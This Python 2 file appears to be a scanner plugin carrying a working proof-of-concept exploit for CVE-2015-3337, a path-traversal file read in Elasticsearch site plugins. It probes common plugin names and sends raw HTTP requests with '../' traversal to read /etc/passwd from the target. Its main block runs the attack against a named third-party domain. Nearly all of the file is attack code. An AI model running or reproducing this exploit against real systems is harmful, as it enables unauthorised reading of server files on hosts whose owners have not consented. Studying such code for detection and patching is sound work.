#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : elasticsearch CVE-2015-3337 本地任意文件读取漏洞
Author    : a
mail      :a@lcx.cc
Referer   :http://www.freebuf.com/vuls/68075.html

"""
from ..miniCurl import Curl
from ..t  import T

import socket
def grab(plugin,host,port,result):
    fpath = '/etc/passwd'  
    socket.setdefaulttimeout(3)
    s = socket.socket()
    s.connect((host,port))
    s.send("GET /_plugin/%s/../../../../../..%s HTTP/1.0\n"
        "Host: %s\n\n" % (plugin, fpath, host))
    file = s.recv(2048)
    if "HTTP/1.0 200 OK" in file and 'root' in file:
        output('CVE-2015-3337',result,'hole')

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg=ip
        curl=Curl()
        result = {}
        result['result']=False

        port =int(port)
        host = arg
        pluginList = ['test','kopf', 'HQ', 'marvel', 'bigdesk' ,'head' ]
        try:
            for plugin in pluginList:     
                socket.setdefaulttimeout(3)
                s = socket.socket()
                s.connect((host,port))
                s.send("GET /_plugin/%s/ HTTP/1.0\n"
                    "Host: %s\n\n" % (plugin, host))
                file = s.recv(16)
                if ("HTTP/1.0 200 OK" in file):
                    grab(plugin,host,port,result)
                    break
        except Exception:
                pass
        finally:
            s.close()
            

        del curl
        return result


def output(url,result,label):
    info = url + '  elasticsearch  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='elasticsearch file read Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/component/elasticsearch/ip_b6e33779b8746d1af33098dd684897f5.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='yunlai.cn',port='80')

#/root/github/poccreate/thirdparty/ip/ip_b6e33779b8746d1af33098dd684897f5.py
#/root/github/poccreate/codesrc/exp-793.py